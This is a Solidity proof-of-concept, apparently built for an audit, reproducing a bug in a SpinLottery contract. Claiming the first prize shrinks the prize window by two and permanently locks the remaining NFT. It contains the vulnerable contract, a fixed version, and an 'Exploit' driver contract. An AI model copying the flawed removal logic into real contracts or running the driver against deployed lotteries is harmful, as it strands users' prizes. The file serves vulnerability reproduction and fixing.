// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RipIt finding 62544:
// "[H-07] SpinLottery will break if the first prizeId is selected".
//
// SpinLottery stores each rarity's prizes in a compact window [firstPrizeId,
// nextPrizeId) over a prizeData mapping, and removes a claimed prize with the
// "unordered removal" pattern (move the LAST prize into the freed slot, then
// shrink the window from the top via nextPrizeId--).
//
// The bug: when the randomly selected prizeId equals firstPrizeId, _claimPrize
// does BOTH pool.firstPrizeId++ AND pool.nextPrizeId--. The window therefore
// shrinks by 2 instead of 1 on a single claim. The survivor that was just moved
// into the freed low slot now sits BELOW the raised firstPrizeId, so it is
// unreachable forever and its escrowed NFT is permanently locked. A pool of 2
// prizes drops to 0 claimable after ONE claim instead of 1.
//
// The vulnerable _claimPrize is inlined VERBATIM from the finding. Only the
// opaque boundaries (a minimal PrizePool struct + a trivial pack/unpack and a
// minimal ERC721 escrow) are represented; the vulnerable function is real.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC721 double: the lottery escrows prize NFTs and hands them to
///      winners on claim. A stranded prize's NFT stays owned by the lottery.
contract PrizeNFT {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function transfer(address to, uint256 id) external {
        require(ownerOf[id] == msg.sender, "NOT_OWNER");
        ownerOf[id] = to;
    }
}

/// @dev Minimal ERC20 marker used only to record the harmed magnitude (1 locked
///      prize NFT) at the SINK so the Playground can measure it as "profit".
contract MarkerToken {
    string public name = "Locked Prize Marker";
    string public symbol = "LOCKED-PRIZE";
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. `_claimPrize` is inlined VERBATIM from the finding.
// ─────────────────────────────────────────────────────────────────────────────
contract SpinLottery {
    error NoPrizesAvailable();

    struct PrizePool {
        mapping(uint256 => uint256) prizeData;
        uint256 firstPrizeId;
        uint256 nextPrizeId;
    }

    mapping(uint8 => PrizePool) internal prizePools;

    // ---- trivial pack/unpack: (nftAddress[160] | tokenId[88] | rarity[8]) ----
    function packPrize(address nftAddress, uint88 tokenId, uint8 rarity) public pure returns (uint256) {
        return uint256(uint160(nftAddress)) | (uint256(tokenId) << 160) | (uint256(rarity) << 248);
    }

    function unpackPrize(uint256 packed) public pure returns (address nftAddress, uint88 tokenId, uint8 rarity) {
        nftAddress = address(uint160(packed));
        tokenId = uint88(packed >> 160);
        rarity = uint8(packed >> 248);
    }

    // ---- minimal seeders / views (test scaffolding, not part of the finding) --
    function seedPrize(uint8 rarity, uint256 prizeId, address nftAddress, uint88 tokenId) external {
        prizePools[rarity].prizeData[prizeId] = packPrize(nftAddress, tokenId, rarity);
    }

    function setPointers(uint8 rarity, uint256 first, uint256 next) external {
        PrizePool storage pool = prizePools[rarity];
        pool.firstPrizeId = first;
        pool.nextPrizeId = next;
    }

    function getPointers(uint8 rarity) external view returns (uint256 first, uint256 next) {
        PrizePool storage pool = prizePools[rarity];
        return (pool.firstPrizeId, pool.nextPrizeId);
    }

    function getPrizeData(uint8 rarity, uint256 prizeId) external view returns (uint256) {
        return prizePools[rarity].prizeData[prizeId];
    }

    function claimableCount(uint8 rarity) external view returns (uint256) {
        PrizePool storage pool = prizePools[rarity];
        if (pool.nextPrizeId <= pool.firstPrizeId) return 0;
        return pool.nextPrizeId - pool.firstPrizeId;
    }

    /// @notice Public spin: claims a prize and delivers its escrowed NFT.
    function spinAndClaim(uint8 rarity, uint256 randomValue, address winner)
        external
        returns (address nftAddress, uint88 tokenId)
    {
        (nftAddress, tokenId) = _claimPrize(rarity, randomValue);
        PrizeNFT(nftAddress).transfer(winner, tokenId);
    }

    // ==== VERBATIM vulnerable function from the finding (only // @> added) =====
    function _claimPrize(uint8 rarity, uint256 randomValue) internal returns (address nftAddress, uint88 tokenId) {
        PrizePool storage pool = prizePools[rarity];
        if (pool.nextPrizeId <= pool.firstPrizeId) revert NoPrizesAvailable();

        // Calculate prize count and random index
        uint256 prizeCount = pool.nextPrizeId - pool.firstPrizeId;
        uint256 index = randomValue % prizeCount;
        uint256 prizeId = pool.firstPrizeId + index;

        // Get prize data
        uint256 packed = pool.prizeData[prizeId];

        // Remove prize using unordered removal pattern - more gas efficient than array management
        // When a prize is removed, we move the last prize to its place if it's not already the last
        if (prizeId != pool.nextPrizeId - 1) {
            uint256 lastPrizeId = pool.nextPrizeId - 1;
            pool.prizeData[prizeId] = pool.prizeData[lastPrizeId];
            delete pool.prizeData[lastPrizeId];
        } else {
            delete pool.prizeData[prizeId];
        }

        // If we've removed the first prize, increment firstPrizeId
        if (prizeId == pool.firstPrizeId) {
            pool.firstPrizeId++; // @> BUG: with nextPrizeId-- below, the window shrinks by 2 not 1; the moved survivor at the freed slot falls below firstPrizeId and is stranded forever
        }

        // Decrement nextPrizeId
        pool.nextPrizeId--;

        uint8 unpackedRarity;
        (nftAddress, tokenId, unpackedRarity) = unpackPrize(packed);
        assert(unpackedRarity == rarity);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): the recommended fix removes the
// `pool.firstPrizeId++;` line. The moved survivor stays inside the window and
// remains claimable, so the window shrinks by exactly 1 per claim.
// ─────────────────────────────────────────────────────────────────────────────
contract SpinLotteryFixed {
    error NoPrizesAvailable();

    struct PrizePool {
        mapping(uint256 => uint256) prizeData;
        uint256 firstPrizeId;
        uint256 nextPrizeId;
    }

    mapping(uint8 => PrizePool) internal prizePools;

    function packPrize(address nftAddress, uint88 tokenId, uint8 rarity) public pure returns (uint256) {
        return uint256(uint160(nftAddress)) | (uint256(tokenId) << 160) | (uint256(rarity) << 248);
    }

    function unpackPrize(uint256 packed) public pure returns (address nftAddress, uint88 tokenId, uint8 rarity) {
        nftAddress = address(uint160(packed));
        tokenId = uint88(packed >> 160);
        rarity = uint8(packed >> 248);
    }

    function seedPrize(uint8 rarity, uint256 prizeId, address nftAddress, uint88 tokenId) external {
        prizePools[rarity].prizeData[prizeId] = packPrize(nftAddress, tokenId, rarity);
    }

    function setPointers(uint8 rarity, uint256 first, uint256 next) external {
        PrizePool storage pool = prizePools[rarity];
        pool.firstPrizeId = first;
        pool.nextPrizeId = next;
    }

    function claimableCount(uint8 rarity) external view returns (uint256) {
        PrizePool storage pool = prizePools[rarity];
        if (pool.nextPrizeId <= pool.firstPrizeId) return 0;
        return pool.nextPrizeId - pool.firstPrizeId;
    }

    function spinAndClaim(uint8 rarity, uint256 randomValue, address winner)
        external
        returns (address nftAddress, uint88 tokenId)
    {
        (nftAddress, tokenId) = _claimPrize(rarity, randomValue);
        PrizeNFT(nftAddress).transfer(winner, tokenId);
    }

    function _claimPrize(uint8 rarity, uint256 randomValue) internal returns (address nftAddress, uint88 tokenId) {
        PrizePool storage pool = prizePools[rarity];
        if (pool.nextPrizeId <= pool.firstPrizeId) revert NoPrizesAvailable();

        uint256 prizeCount = pool.nextPrizeId - pool.firstPrizeId;
        uint256 index = randomValue % prizeCount;
        uint256 prizeId = pool.firstPrizeId + index;

        uint256 packed = pool.prizeData[prizeId];

        if (prizeId != pool.nextPrizeId - 1) {
            uint256 lastPrizeId = pool.nextPrizeId - 1;
            pool.prizeData[prizeId] = pool.prizeData[lastPrizeId];
            delete pool.prizeData[lastPrizeId];
        } else {
            delete pool.prizeData[prizeId];
        }

        // FIX: do NOT increment firstPrizeId. The moved survivor already occupies
        // the freed slot and must stay inside [firstPrizeId, nextPrizeId).

        pool.nextPrizeId--;

        uint8 unpackedRarity;
        (nftAddress, tokenId, unpackedRarity) = unpackPrize(packed);
        assert(unpackedRarity == rarity);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: seed a 2-prize pool (firstPrizeId=1, nextPrizeId=3). One spin
// hits the first prize, collapsing the window 2 -> 0. The survivor's prizeData
// record still holds a valid moved prize and its NFT stays locked in the
// lottery; the next spin reverts NoPrizesAvailable. Harm recorded to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant WINNER1 = 0x0000000000000000000000000000000000000a01;
    address internal constant WINNER2 = 0x0000000000000000000000000000000000000a02;

    uint8 internal constant RARITY = 1;
    uint88 internal constant TOKEN_A = 100; // originally at prizeId 1
    uint88 internal constant TOKEN_B = 200; // originally at prizeId 2 (the survivor)

    // Exposed results for the driver + Playground.
    uint256 public claimableBefore;
    uint256 public claimableAfterBuggy;
    bool public secondSpinReverted;
    uint256 public strandedPrizeData;
    uint256 public firstPrizeIdAfter;
    uint256 public nextPrizeIdAfter;
    uint256 public lockedNftCount;
    uint256 public sinkMarkerBalance;
    address public lotteryAddr;
    address public markerAddr;
    address public nftAddr;

    function run() external payable {
        // --- deploy doubles + vulnerable contract, fixed order (marker LAST) ---
        PrizeNFT nft = new PrizeNFT();                          // nonce 1
        SpinLottery lottery = new SpinLottery(/* no ctor args */); // nonce 2
        MarkerToken marker = new MarkerToken();                // nonce 3 (LAST)

        nftAddr = address(nft);
        lotteryAddr = address(lottery);
        markerAddr = address(marker);

        // --- escrow both prize NFTs in the lottery ---
        nft.mint(address(lottery), TOKEN_A);
        nft.mint(address(lottery), TOKEN_B);

        // --- seed one rarity pool with 2 prizes; window [1, 3) ---
        lottery.seedPrize(RARITY, 1, address(nft), TOKEN_A);
        lottery.seedPrize(RARITY, 2, address(nft), TOKEN_B);
        lottery.setPointers(RARITY, 1, 3);

        claimableBefore = lottery.claimableCount(RARITY); // 2

        // --- WINNER1 spins with randomValue=0 -> index 0 -> prizeId == firstPrizeId == 1 ---
        lottery.spinAndClaim(RARITY, 0, WINNER1);

        (firstPrizeIdAfter, nextPrizeIdAfter) = lottery.getPointers(RARITY); // (2, 2)
        claimableAfterBuggy = lottery.claimableCount(RARITY);                // 0
        strandedPrizeData = lottery.getPrizeData(RARITY, 1);                 // still a valid moved prize (TOKEN_B)

        // --- WINNER2 can never claim the surviving prize: NoPrizesAvailable ---
        try lottery.spinAndClaim(RARITY, 0, WINNER2) returns (address, uint88) {
            secondSpinReverted = false;
        } catch {
            secondSpinReverted = true;
        }

        // --- the survivor's NFT (TOKEN_B) is permanently locked in the lottery ---
        lockedNftCount = (nft.ownerOf(TOKEN_A) == address(lottery) ? 1 : 0)
            + (nft.ownerOf(TOKEN_B) == address(lottery) ? 1 : 0);

        // --- HARM: exactly one prize permanently lost after a single claim ---
        require(claimableBefore == 2, "expected 2 prizes seeded");
        require(claimableAfterBuggy == 0, "window must collapse 2 -> 0");
        require(strandedPrizeData != 0, "survivor prize record must remain");
        require(secondSpinReverted, "second spin must revert NoPrizesAvailable");
        require(lockedNftCount == 1, "exactly one prize NFT stranded in the contract");

        // record the harmed magnitude (1 locked prize NFT) at the SINK
        marker.mint(SINK, 1);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
